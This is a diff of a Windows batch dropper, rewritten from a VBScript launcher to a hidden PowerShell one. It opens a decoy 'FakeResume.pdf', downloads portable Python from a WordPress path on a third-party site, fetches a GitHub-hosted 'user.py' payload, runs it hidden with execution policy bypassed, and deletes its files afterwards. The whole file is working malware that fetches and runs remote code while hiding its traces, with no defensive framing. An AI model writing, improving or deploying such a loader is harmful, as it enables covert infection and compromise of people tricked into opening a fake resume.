@@ -1,45 +1,45 @@
 @echo off
 
-REM Create VBScript to run everything invisibly
-echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\inv.vbs"
-echo WshShell.Run "cmd /c ""%temp%\exec.cmd""", 0, False >> "%temp%\inv.vbs"
+REM Create PowerShell script
+echo $ProgressPreference='SilentlyContinue' > "%temp%\run.ps1"
+echo Start-Process powershell -WindowStyle Hidden -ArgumentList '-File',"%temp%\exec.ps1" >> "%temp%\run.ps1"
 
-REM Create the actual execution script
+REM Create execution script
 (
-echo @echo off
+echo $ProgressPreference='SilentlyContinue'
 echo.
-echo REM Open PDF first
-echo start /b powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://github.com/workspacehome0/download/raw/main/FakeResume.pdf' -OutFile $env:temp'\doc.pdf' -UseBasicParsing;Start-Process $env:temp'\doc.pdf'"
-echo timeout /t 2 /nobreak ^>nul
+echo # Open PDF
+echo Invoke-WebRequest -Uri 'https://github.com/workspacehome0/download/raw/main/FakeResume.pdf' -OutFile $env:temp\doc.pdf -UseBasicParsing
+echo Start-Process $env:temp\doc.pdf
+echo Start-Sleep -Seconds 2
 echo.
-echo REM Download Python portable
-echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://staging.derideal.com/wp-content/app/python-portable.zip' -OutFile $env:temp'\py.zip' -UserAgent 'Mozilla/5.0' -UseBasicParsing" ^>nul 2^>^&1
-echo timeout /t 3 /nobreak ^>nul
+echo # Download Python
+echo Invoke-WebRequest -Uri 'https://staging.derideal.com/wp-content/app/python-portable.zip' -OutFile $env:temp\py.zip -UserAgent 'Mozilla/5.0' -UseBasicParsing
+echo Start-Sleep -Seconds 2
 echo.
-echo REM Extract Python
-echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Expand-Archive -Path $env:temp'\py.zip' -DestinationPath $env:temp'\py' -Force" ^>nul 2^>^&1
-echo timeout /t 3 /nobreak ^>nul
+echo # Extract Python
+echo Expand-Archive -Path $env:temp\py.zip -DestinationPath $env:temp\py -Force
+echo Start-Sleep -Seconds 2
 echo.
-echo REM Download payload
-echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py' -OutFile $env:temp'\user.py' -UseBasicParsing" ^>nul 2^>^&1
-echo timeout /t 1 /nobreak ^>nul
+echo # Download payload
+echo Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py' -OutFile $env:temp\user.py -UseBasicParsing
 echo.
-echo REM Run Python payload ^(hidden^)
-echo if exist "%temp%\py\python.exe" start /min "" "%temp%\py\python.exe" "%temp%\user.py"
+echo # Run payload hidden
+echo if ^(Test-Path $env:temp\py\python.exe^) {
+echo     Start-Process -WindowStyle Hidden $env:temp\py\python.exe -ArgumentList $env:temp\user.py
+echo }
 echo.
-echo REM Cleanup after delay
-echo timeout /t 15 /nobreak ^>nul
-echo del "%temp%\py.zip" 2^>nul
-echo del "%temp%\user.py" 2^>nul
-echo del "%temp%\doc.pdf" 2^>nul
-echo del "%temp%\exec.cmd" 2^>nul
-echo del "%temp%\inv.vbs" 2^>nul
-echo rd /s /q "%temp%\py" 2^>nul
-) > "%temp%\exec.cmd"
+echo # Cleanup after delay
+echo Start-Sleep -Seconds 15
+echo Remove-Item $env:temp\py.zip -Force -ErrorAction SilentlyContinue
+echo Remove-Item $env:temp\user.py -Force -ErrorAction SilentlyContinue
+echo Remove-Item $env:temp\doc.pdf -Force -ErrorAction SilentlyContinue
+echo Remove-Item $env:temp\run.ps1 -Force -ErrorAction SilentlyContinue
+echo Remove-Item $env:temp\exec.ps1 -Force -ErrorAction SilentlyContinue
+echo Remove-Item -Recurse -Force $env:temp\py -ErrorAction SilentlyContinue
+) > "%temp%\exec.ps1"
 
-REM Execute via VBScript (completely invisible)
-cscript //nologo "%temp%\inv.vbs"
+REM Run invisibly
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp%\run.ps1"
 
-REM Exit immediately
 exit
-
